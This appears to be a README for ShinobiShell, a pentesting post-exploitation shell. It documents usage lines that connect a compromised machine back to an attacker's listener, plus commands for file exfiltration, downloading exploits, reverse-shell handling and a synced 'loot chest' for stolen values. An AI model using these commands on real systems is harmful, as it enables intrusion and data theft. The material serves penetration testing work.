# ShinobiShell
An experimental shell that handles file exfiltration, exploit injection and various other obnoxious tasks.
```
Shinobi shell is a shell specifically designed to make exfiltration, proxying, persistance and other pentesting actions easier.

'-a', '--address', The machine address with a Shinobi Shell listener running'
'-l', '--listen', 'Starts Shinobi Shell listener on port passed in'
'-k', '--key', 'Secret shared key used to create an encrypted tunnel between Shinobi Server and Clients (Required)'
'-r', '--serveraddress', 'Local IP Address used for universal reverse shell handler'
```
Use:

Server (Attacking box) 
`./shinobishell.py -l 4443 -k 1234567890123456`

Client (Penetrated box) 
`./shinobishell.py --address 192.168.1.2:4443 -k 123456790123456` 

```
Shinobi Shell v1.0
Author: Anthony Russell
Contact: Twitter @DotNetRussell
Blog: https://DotNetRussell.com  (don't hack me bro)

Commands:

help -                      displays help information
machineinfo -               displays a series of machine variables to help with priv esc
searchsploit -              <search text> sends a searchsploit command back to your attacking machine and returns the results through shinobi tunnel
exfil <file name> -         exfiltrates a file back to your attacking machine via shinobi tunnel
ssdownload <exploit path> - downloads a search sploit exploit from your attacking machine
download <url> -            does a wget for your file on your attacking machine and then transfers it to you over shinobi tunnel
linenumdownlods -           linenum.sh to the Shinobi Server and then transfers it back to the client

Loot Chest:

loot store <key> <value> -  stores a key value pair in your loot chest
loot <key> -                gets a loot value
loot show -                 shows everything in loot chest

NOTE: Loot chest auto syncs with attacking machine
	
Auto Aliases
lsa == ls -la
```
